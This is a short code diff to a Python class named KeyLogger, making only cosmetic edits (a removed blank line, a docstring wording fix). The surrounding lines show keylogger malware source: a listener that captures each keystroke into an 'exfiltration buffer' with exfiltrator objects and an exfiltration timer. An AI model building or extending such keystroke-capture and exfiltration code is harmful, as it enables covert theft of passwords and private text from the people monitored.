@@ -22,7 +22,6 @@ class KeyLogger(object):
         self.exfil_time = exfil_time
         self.data_buffer: list[str] = ["Keylogger Initialized"]
         self.__exfiltrators = list()
-
         '''Mapping of key names to string characters for human-readable 
         text output. Add more mappings as necessary depending on the 
         host and the character set it works with.'''
@@ -55,7 +54,7 @@ class KeyLogger(object):
         self.data_buffer.clear()
 
     def _on_press(self, key: keyboard.Key) -> None:
-        """Add the string representation of each key stroke captured by
+        """Add the string representation of each keystroke captured by
         the listener thread to the exfiltration buffer."""
         try:  # A key was pressed and caught by the listener
             pressed_key: str = key.char  # The key is alphanumeric
